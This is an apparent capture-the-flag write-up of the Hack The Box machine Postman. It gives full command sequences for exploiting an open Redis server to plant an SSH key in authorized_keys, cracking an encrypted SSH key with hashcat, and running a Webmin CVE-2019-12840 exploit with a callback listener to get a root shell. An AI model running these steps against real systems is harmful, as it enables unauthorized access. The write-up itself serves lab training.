---
date: 2025-12-04
categories: [Linux, Easy]
---

<img width="300" height="300" alt="Union" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ad38e890e4e93afce51118bec4b9f48b.png" />

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [TheCyberGeek](https://app.hackthebox.com/users/114053)    | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---






##  Enumeration

- I began with a full TCP port scan, followed by a service and version detection scan on the discovered open ports
	
	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.10.160 -oG scan
	/opt/extractports scan
	nmap -p22,80,6379,10000 -sCV -Pn 10.10.10.160 -oN ports
	```
	
	<img width="1149" height="435" alt="image" src="https://github.com/user-attachments/assets/d0b252f0-e816-44fe-b602-457a930fd48d" />

## Initial Access (Redis Exploitation)


- I connected to the Redis instance

	```python
	redis-cli -h 10.10.10.160 -p 6379
	```

- Using Redis commands, I retrieved system information

  ```python
  info
  config get *
  ```

- My first attempt was to write a PHP webshell directly into `/var/www/html`, but insufficient permissions prevented this

	```python
	redis-cli -h 10.10.10.160
	config set dir /var/www/html
	config set dbfilename redis.php
	set test "<?php phpinfo(); ?>"
	save
	```

- I checked the configured working directory 

	```python
	config get dir
	```

- Redis was operating from `/var/lib/redis`. I leveraged this to overwrite the `authorized_keys` file with my SSH public key, granting remote access.

- This technique follows the standard Redis persistence abuse documented in [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html#template-webshell).

	```python
	ssh-keygen -t rsa
	(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
	
	cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
	
	redis-cli -h 10.10.10.160
	config set dir /var/lib/redis/.ssh
	config set dbfilename "authorized_keys"
	save
	```

- I then authenticated over SSH:

	```python
	ssh -i id_rsa redis@10.10.10.160
	```

- Inside the system, I found an encrypted private SSH key (`id_rsa.bak`) in `/opt/`. I extracted its hash and cracked it:

	```python
	ssh2john id_rsa.bak  > hash
	hashcat -m 22911 hash /usr/share/wordlists/rockyou.txt
	```

- After retrieving the decrypted password, I switched to user **Matt**:

	```python
	su Matt
	```

- This allowed me to read the user flag.

## Privilege Escalation

- While reviewing the system, I identified Webmin running as root:

	```python
	ps -eo user,command
	```

- Port **10000** hosted the Webmin interface. I added the discovered hostnames to `/etc/hosts`:
	- `postman.htb`
	- `postman`

- I authenticated to Webmin using Mattâ€™s credentials. Upon inspecting the interface, I identified the version:
	- **Webmin 1.910**
    
- This version is known to be vulnerable to **CVE-2019-12840**, an RCE vulnerability.

- I located a working public [POC](https://github.com/KrE80r/webmin_cve-2019-12840_poc)  and executed it:  

	```python
	python3 CVE-2019-12840.py -U Matt -P computer2008 -u "https://postman" -lport 4444 -lhost 10.10.14.6
	```

- The exploit provided a root shell, allowing me to retrieve the root flag.
